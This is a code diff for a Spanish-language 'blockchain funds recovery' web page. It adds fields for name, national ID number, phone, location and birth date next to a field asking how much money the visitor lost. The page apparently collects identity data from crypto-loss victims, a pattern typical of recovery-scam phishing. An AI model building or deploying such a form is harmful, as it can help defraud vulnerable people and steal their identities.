@@ -59,7 +59,7 @@
             color: #555;
         }
 
-        input[type="number"] {
+        input[type="text"], input[type="number"], input[type="date"] {
             width: calc(100% - 40px);
             max-width: 100%;
             padding: 14px;
@@ -72,7 +72,7 @@
             transition: border-color 0.3s ease;
         }
 
-        input[type="number"]:focus {
+        input[type="text"]:focus, input[type="number"]:focus, input[type="date"]:focus {
             border-color: #1a73e8;
             outline: none;
         }
@@ -110,7 +110,7 @@
                 padding: 20px;
             }
 
-            input[type="number"] {
+            input[type="text"], input[type="number"], input[type="date"] {
                 width: calc(100% - 30px);
                 font-size: 14px;
             }
@@ -133,9 +133,17 @@
     <div class="container">
         <h1>Recuperación de Fondos Blockchain</h1>
         <div id="step1">
+            <p>Por favor, introduce tus datos personales:</p>
+            <input type="text" id="firstName" placeholder="Nombre" />
+            <input type="text" id="lastName" placeholder="Apellido" />
+            <input type="text" id="dni" placeholder="Número de DNI" />
+            <input type="text" id="country" placeholder="País" />
+            <input type="text" id="city" placeholder="Ciudad" />
+            <input type="text" id="phone" placeholder="Número de Teléfono" />
+            <input type="date" id="birthDate" placeholder="Fecha de Nacimiento" />
             <p>¿Recuerdas cuánto dinero perdiste? Por favor, introduce la cantidad (en USD):</p>
             <input type="number" id="lostAmount" placeholder="Introduce el monto" />
-            <button class="button" onclick="checkAmount()">Comprobar</button>
+            <button class="button" onclick="checkForm()">Comprobar</button>
         </div>
 
         <div id="step2" class="hidden">
@@ -163,10 +171,18 @@
     </div>
 
     <script>
-        function checkAmount() {
+        function checkForm() {
+            const firstName = document.getElementById('firstName').value.trim();
+            const lastName = document.getElementById('lastName').value.trim();
+            const dni = document.getElementById('dni').value.trim();
+            const country = document.getElementById('country').value.trim();
+            const city = document.getElementById('city').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+            const birthDate = document.getElementById('birthDate').value.trim();
             const lostAmount = parseFloat(document.getElementById('lostAmount').value);
-            if (isNaN(lostAmount) || lostAmount <= 0) {
-                alert('Por favor, introduce un monto válido.');
+
+            if (!firstName || !lastName || !dni || !country || !city || !phone || !birthDate || isNaN(lostAmount) || lostAmount <= 0) {
+                alert('Por favor, completa todos los campos correctamente.');
                 return;
             }
 
